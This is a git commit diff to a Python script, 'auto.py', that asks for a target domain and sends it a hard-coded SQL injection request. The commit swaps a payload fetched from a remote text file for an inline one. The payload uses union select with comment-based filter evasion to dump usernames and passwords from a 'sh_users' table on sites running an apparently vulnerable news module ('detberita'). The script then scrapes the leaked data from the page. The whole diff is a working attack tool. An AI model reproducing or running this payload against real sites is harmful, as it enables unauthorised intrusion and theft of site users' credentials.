131d21a73a338ca6cd42f49def1d2ce8cab3b709
Nor Ahmad <48079150+archive-code@users.noreply.github.com>
2019-05-27 21:51:18 +0700

    Update auto.py

--- auto.py
+++ auto.py
@@ -21,11 +21,9 @@ l2b = l2a.text.rstrip().lstrip()
 print (l2b)
 
 uDOMEN = input('Masukkan Domain Target: ')
-l3 = get("https://raw.githubusercontent.com/archive-code/gapenting/master/b.txt")
-l3a = BeautifulSoup(l3.text, 'html.parser')
-l3b = l3a.text.rstrip().lstrip()
+l3a = ("/?p=detberita&id=1%27%20and%20%40x%3A%3Dconcat%2F**_**%2F((select(@x)from(select(@x:=0x00),(select(0)from(sh_users)where(0x00)in(@x:=concat+(@x,0x3c62723e,s_username,0x203a3a20,sandiusers,%22||%22))))x))%20/*!50000union*/%20/*!50000select*/%201,@x,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--+")
 
-urla = get("http://"+uDOMEN+l3b)
+urla = get("http://"+uDOMEN+l3a)
 soup = BeautifulSoup(urla.text, 'html.parser')
 hasil = soup.find('h3')
 try:
